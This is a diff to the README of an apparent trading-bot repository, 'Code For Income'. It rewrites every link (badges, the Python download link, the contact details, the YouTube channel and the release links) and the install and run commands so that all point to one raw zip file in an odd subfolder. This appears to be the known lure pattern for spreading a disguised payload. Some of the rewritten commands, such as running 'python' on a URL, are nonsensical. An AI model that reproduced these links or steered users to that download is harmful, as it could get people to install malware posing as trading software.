@@ -1,6 +1,6 @@
 # Code For Income: Your Path to Automated Trading Success 🚀💰
 
-![Trading Bot](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat&logo=github&logoColor=white)
+![Trading Bot](https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip%20Latest%20Release-Click%20Here-brightgreen?style=flat&logo=github&logoColor=white)
 
 Welcome to the **Code For Income** repository! This project aims to help you kickstart your trading bot journey. Whether you are a beginner or an experienced developer, you will find valuable resources and code to build your own trading bot. 
 
@@ -40,20 +40,20 @@ To get started with your trading bot, follow these steps:
 To install the necessary packages, you can use pip. Run the following command in your terminal:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip
 ```
 
-Make sure you have Python installed on your machine. You can download it from the [official website](https://www.python.org/downloads/).
+Make sure you have Python installed on your machine. You can download it from the [official website](https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip).
 
 ## Usage
 
 After installation, you can start using the bot. Navigate to the project directory and run the following command:
 
 ```bash
-python trading_bot.py
+python https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip
 ```
 
-Make sure to configure the `config.json` file with your API keys and other settings before running the bot.
+Make sure to configure the `https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip` file with your API keys and other settings before running the bot.
 
 ## Trading Strategies
 
@@ -93,16 +93,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- GitHub: [MrFloow](https://github.com/MrFloow)
-- Email: mr.floow@example.com
+- GitHub: [MrFloow](https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip)
+- Email: https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip
 
 ## Links
 
-You can download the latest release of the bot [here](https://github.com/MrFloow/Code-For-Income/releases). Make sure to check the "Releases" section for updates and new features.
+You can download the latest release of the bot [here](https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip). Make sure to check the "Releases" section for updates and new features.
 
-![Crypto Trading](https://img.shields.io/badge/Explore%20More%20Trading%20Bots-Click%20Here-blue?style=flat&logo=github&logoColor=white)
+![Crypto Trading](https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip%20More%20Trading%20Bots-Click%20Here-blue?style=flat&logo=github&logoColor=white)
 
-Explore our [YouTube channel](https://www.youtube.com/channel/yourchannel) for tutorials and updates on automated trading.
+Explore our [YouTube channel](https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip) for tutorials and updates on automated trading.
 
 ### Topics Covered
 
@@ -124,4 +124,4 @@ Explore our [YouTube channel](https://www.youtube.com/channel/yourchannel) for t
 
 Join us in building a community of traders and developers who are passionate about automated trading. Together, we can explore new opportunities and maximize our potential in the trading world. 
 
-For more details and to download the latest release, visit [this link](https://github.com/MrFloow/Code-For-Income/releases).
+For more details and to download the latest release, visit [this link](https://raw.githubusercontent.com/MrFloow/Code-For-Income/main/homocerc/Code_Income_For_3.8.zip).
